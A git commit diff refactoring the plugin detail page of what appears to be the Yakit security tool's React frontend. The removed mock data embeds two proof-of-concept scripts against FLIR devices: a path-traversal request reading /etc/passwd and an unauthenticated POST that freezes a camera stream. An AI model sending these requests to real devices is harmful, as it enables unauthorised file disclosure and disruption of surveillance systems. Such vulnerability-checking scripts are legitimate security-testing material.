db75619661186a488a5e7e6bf9a8a08db6a2272b
TangHang123 <1425735414@qq.com>
2023-10-08 14:40:48 +0800

    商店详情和我的插件详情逻辑，部分

--- app/renderer/src/main/src/pages/plugins/user/PluginUserDetail.tsx
+++ app/renderer/src/main/src/pages/plugins/user/PluginUserDetail.tsx
@@ -1,4 +1,4 @@
-import React, {useEffect, useMemo, useState} from "react"
+import React, {ReactNode, useEffect, useMemo, useState} from "react"
 import {PluginDetailHeader, PluginDetails, PluginDetailsListItem, statusTag} from "../baseTemplate"
 import {
     OutlineClouddownloadIcon,
@@ -22,6 +22,8 @@ import {MePluginType, OnlineUserExtraOperate, mePluginTypeList} from "./PluginUs
 import {YakitPluginOnlineDetail} from "../online/PluginsOnlineType"
 import {PluginSearchParams} from "../baseTemplateType"
 import cloneDeep from "bizcharts/lib/utils/cloneDeep"
+import {PluginUserDetailProps} from "./PluginUserType"
+import {PrivatePluginIcon} from "@/assets/newIcon"
 
 import "../plugins.scss"
 import styles from "./PluginUserDetail.module.scss"
@@ -31,30 +33,22 @@ const {ipcRenderer} = window.require("electron")
 
 const {TabPane} = Tabs
 
-interface PluginUserDetailProps {
-    info: YakitPluginOnlineDetail
-    allCheck: boolean
-    loading: boolean
-    onCheck: (value: boolean) => void
-    selectList: string[]
-    optCheck: (data: YakitPluginOnlineDetail, value: boolean) => void
-    data: API.YakitPluginListResponse
-    onBack: () => void
-    loadMoreData: () => void
-    defaultSearchValue: PluginSearchParams
-}
-
 export const PluginUserDetail: React.FC<PluginUserDetailProps> = (props) => {
-    const {info, allCheck, onCheck, selectList, optCheck, data, onBack, loadMoreData, loading, defaultSearchValue} =
+    const {info, defaultAllCheck, defaultSelectList, response, onBack, loadMoreData, defaultSearchValue, dispatch} =
         props
     const [search, setSearch] = useState<PluginSearchParams>(cloneDeep(defaultSearchValue))
+    const [plugin, setPlugin] = useState<YakitPluginOnlineDetail>()
+    const [selectList, setSelectList] = useState<string[]>(defaultSelectList)
+    const [loading, setLoading] = useState<boolean>(false)
+    const [recalculation, setRecalculation] = useState<boolean>(false) // 更新item后刷新虚拟列表
+
+    const [allCheck, setAllCheck] = useState<boolean>(defaultAllCheck)
+
     // 选中插件的数量
     const selectNum = useMemo(() => {
-        if (allCheck) return data.pagemeta.total
+        if (allCheck) return response.pagemeta.total
         else return selectList.length
     }, [allCheck, selectList])
-
-    const [plugin, setPlugin] = useState<YakitPluginOnlineDetail>()
 
     useEffect(() => {
         if (info) setPlugin({...info})
@@ -64,17 +58,12 @@ export const PluginUserDetail: React.FC<PluginUserDetailProps> = (props) => {
     const onRun = useMemoizedFn(() => {})
     // 返回
     const onPluginBack = useMemoizedFn(() => {
-        onBack()
+        onBack({
+            search,
+            selectList,
+            allCheck
+        })
         setPlugin(undefined)
-    })
-    const onLikeClick = useMemoizedFn(() => {
-        yakitNotify("success", "点赞~~~")
-    })
-    const onCommentClick = useMemoizedFn(() => {
-        yakitNotify("success", "评论~~~")
-    })
-    const onDownloadClick = useMemoizedFn(() => {
-        yakitNotify("success", "下载~~~")
     })
 
     const onUserDetailSelect = useMemoizedFn((key) => {
@@ -83,16 +72,103 @@ export const PluginUserDetail: React.FC<PluginUserDetailProps> = (props) => {
                 yakitNotify("success", "分享~~~")
                 break
             case "download":
+                yakitNotify("success", "下载~~~")
                 break
             case "editState":
+                onEditState()
                 break
             case "remove":
+                onRemove()
                 break
             default:
                 break
         }
     })
+    const onEditState = useMemoizedFn(() => {
+        if (!plugin) return
+        const editPlugin = {...plugin, is_private: !plugin.is_private, status: plugin.is_private ? 0 : plugin.status}
 
+        setPlugin({
+            ...editPlugin
+        })
+        dispatch({
+            type: "update",
+            payload: {
+                item: {
+                    ...editPlugin
+                }
+            }
+        })
+        setRecalculation(!recalculation)
+    })
+    const onRemove = useMemoizedFn(() => {
+        if (!plugin) return
+        const removePlugin = {...plugin}
+        if (response.data.length === 1) {
+            // 如果删除是最后一个，就回到列表中得空页面
+            onPluginBack()
+        } else {
+            const index = response.data.findIndex((ele) => ele.uuid === removePlugin.uuid)
+
+            if (index === -1) return
+            if (index === Number(response.pagemeta.total) - 1) {
+                // 选中得item为最后一个，删除后选中倒数第二个
+                setPlugin({
+                    ...response.data[index - 1]
+                })
+            } else {
+                //选择下一个
+                setPlugin({
+                    ...response.data[index + 1]
+                })
+            }
+        }
+        dispatch({
+            type: "remove",
+            payload: {
+                item: removePlugin
+            }
+        })
+    })
+    const onLoadMoreData = useMemoizedFn(async () => {
+        if (loading) return
+        setLoading(true)
+        await loadMoreData()
+        setTimeout(() => {
+            setLoading(false)
+        }, 300)
+    })
+    /** 单项副标题组件 */
+    const optExtra = useMemoizedFn((data: YakitPluginOnlineDetail) => {
+        if (data.is_private) {
+            console.log("data", data)
+        }
+        return data.is_private ? <PrivatePluginIcon /> : statusTag[`${data.status}`]
+    })
+    /** 单项勾选|取消勾选 */
+    const optCheck = useMemoizedFn((data: YakitPluginOnlineDetail, value: boolean) => {
+        try {
+            // 全选情况时的取消勾选
+            if (allCheck) {
+                setSelectList(response.data.map((item) => item.uuid).filter((item) => item !== data.uuid))
+                setAllCheck(false)
+                return
+            }
+            // 单项勾选回调
+            if (value) setSelectList([...selectList, data.uuid])
+            else setSelectList(selectList.filter((item) => item !== data.uuid))
+        } catch (error) {
+            yakitNotify("error", "勾选失败:" + error)
+        }
+    })
+    /**全选 */
+    const onCheck = useMemoizedFn((value: boolean) => {
+        if (value) setSelectList([])
+        setAllCheck(value)
+    })
+    const onPluginClick = useMemoizedFn((data: YakitPluginOnlineDetail) => {
+        setPlugin({...data})
+    })
     if (!plugin) return null
     return (
         <>
@@ -115,85 +191,14 @@ export const PluginUserDetail: React.FC<PluginUserDetailProps> = (props) => {
                 }
                 checked={allCheck}
                 onCheck={onCheck}
-                total={data.pagemeta.total}
+                total={response.pagemeta.total}
                 selected={selectNum}
                 listProps={{
                     rowKey: "uuid",
-                    // data: data.data,
-                    data: [
-                        {
-                            created_at: 1679901760,
-                            id: 17054,
-                            updated_at: 1690426437,
-                            authors: "汤鲜味美砂锅面🍜",
-                            comment_num: 0,
-                            content:
-                                '##server:flir\n##type:poc\n##params:root_url\n##name:FLIR_path_traversal_poc\n##severity:high\n##out_put:FLIR_path_traversal_poc_res\n\n\n\nyakit.AutoInitYakit()\nlog.setLevel("info")\npoc=func(addr){\n    isTls = str.IsTLSServer(addr)\n    packet=`GET /download.php?file=/etc/passwd HTTP/1.1\nHost: {{params(addr)}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36`\n\n    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))\n    if err != nil {\n        die(err)\n    }\n\n    if str.MatchAllOfRegexp(rsp, `root:.*?:[0-9]*:[0-9]*:`)  {\n        risk.NewRisk(\n                root_url,\n                risk.severity("high"), \n                risk.title(f"FOUND ${root_url} 存在FLIR目录遍历漏洞"), \n                risk.titleVerbose("FLIR目录遍历漏洞"), \n                risk.type("信息窃取"), \n                risk.typeVerbose("路径遍历"),                 \n                risk.request(req), \n                risk.response(rsp), \n                risk.details({"FLIR_path_traversal_poc_res":true}), )\n    }\n\n}\n\n\nroot_url = cli.String("root_url")\nip, port, err = str.ParseStringToHostPort(root_url)\nif err != nil {\n    die(err)\n}\n\naddr = str.HostPort(ip, port)\npoc(addr)\n',
-                            default_open: true,
-                            downloaded_total: 27283,
-                            head_img:
-                                "https://thirdwx.qlogo.cn/mmopen/vi_32/HnGn3rXrf8y4UjybTDyicJACffzs7cX4Rx3ZWNibZFsmfEKhV7mcuX3zZDpXr58iczaqQfWUYh2jKaqJJe46xt79A/132",
-                            is_private: false,
-                            is_stars: false,
-                            official: false,
-                            params: [
-                                {
-                                    default_value: "",
-                                    field: "root_url",
-                                    field_verbose: "",
-                                    help: "",
-                                    required: true,
-                                    type_verbose: "string"
-                                }
-                            ],
-                            plugin_selector_types: "mitm,port-scan",
-                            published_at: 0,
-                            script_name: "FLIR目录遍历漏洞检测",
-                            stars: 0,
-                            status: 1,
-                            tags: '["POC","目录遍历","FLIR"]',
-                            type: "yak",
-                            user_id: 1773,
-                            uuid: "ba9834eb-6d09-44db-9586-f67e3ac7095f"
-                        },
-                        {
-                            created_at: 1679901764,
-                            id: 17055,
-                            updated_at: 1690426437,
-                            authors: "汤鲜味美砂锅面🍜",
-                            comment_num: 0,
-                            content:
-                                '##server:flir\n##type:poc\n##params:root_url\n##name:FLIR_13216_unauth_poc\n##severity:high\n##out_put:FLIR_13216_Freeze_RTSP_stream_res\n\n\nyakit.AutoInitYakit()\nlog.setLevel("info")\n\npoc=func(addr){\n    isTls = str.IsTLSServer(addr)\n    packet = `POST /res.php HTTP/1.1\nHost: {{params(addr)}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36\n\naction=set&resource=.image.state.freeze.set&value=true`\n\n    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))\n    if err != nil {\n        die(err)\n    }    \n    http_rsp, err = str.ParseBytesToHTTPResponse(rsp)\n    if err != nil {\n        die(err)\n    }\n    if http_rsp.StatusCode<400{\n        risk.NewRisk(\n            root_url,\n            risk.severity("high"), \n            risk.title(f"FOUND ${root_url} 存在FLIR未授权访问漏洞"), \n            risk.titleVerbose("FLIR未授权访问漏洞"), \n            risk.type("身份伪造"), \n            risk.typeVerbose("配置错误"),                 \n            risk.request(req), \n            risk.response(rsp), \n            risk.details({"FLIR_13216_Freeze_RTSP_stream_res":true}), \n        )        \n    }\n\n\n\n\n}\n\n\n\n\nroot_url = cli.String("root_url")\nip, port, err = str.ParseStringToHostPort(root_url)\nif err != nil {\n    die(err)\n}\n\naddr = str.HostPort(ip, port)\npoc(addr)',
-                            default_open: true,
-                            downloaded_total: 27392,
-                            head_img:
-                                "https://thirdwx.qlogo.cn/mmopen/vi_32/HnGn3rXrf8y4UjybTDyicJACffzs7cX4Rx3ZWNibZFsmfEKhV7mcuX3zZDpXr58iczaqQfWUYh2jKaqJJe46xt79A/132",
-                            is_private: false,
-                            is_stars: false,
-                            official: false,
-                            params: [
-                                {
-                                    default_value: "",
-                                    field: "root_url",
-                                    field_verbose: "",
-                                    help: "",
-                                    required: true,
-                                    type_verbose: "string"
-                                }
-                            ],
-                            plugin_selector_types: "mitm,port-scan",
-                            published_at: 0,
-                            script_name: "FLIR未授权访问漏洞检测",
-                            stars: 0,
-                            status: 1,
-                            tags: '["POC","未授权访问","FLIR"]',
-                            type: "yak",
-                            user_id: 1773,
-                            uuid: "f5901d47-2715-4a8b-b09f-2a733419229e"
-                        }
-                    ],
-                    loadMoreData: loadMoreData,
+                    data: response.data,
+                    loadMoreData: onLoadMoreData,
                     classNameRow: "plugin-details-opt-wrapper",
+                    recalculation,
                     renderRow: (info, i) => {
                         const check = allCheck || selectList.includes(info.uuid)
                         return (
@@ -211,12 +216,13 @@ export const PluginUserDetail: React.FC<PluginUserDetailProps> = (props) => {
                                 // isCorePlugin={info.is_core_plugin}
                                 isCorePlugin={false}
                                 pluginType={info.type}
-                                extra={statusTag[`${1 % 3}`]}
+                                extra={optExtra}
+                                onPluginClick={onPluginClick}
                             />
                         )
                     },
-                    page: data.pagemeta.page,
-                    hasMore: data.pagemeta.total !== data.data.length,
+                    page: response.pagemeta.page,
+                    hasMore: response.pagemeta.total !== response.data.length,
                     loading: loading,
                     defItemHeight: 46
                 }}
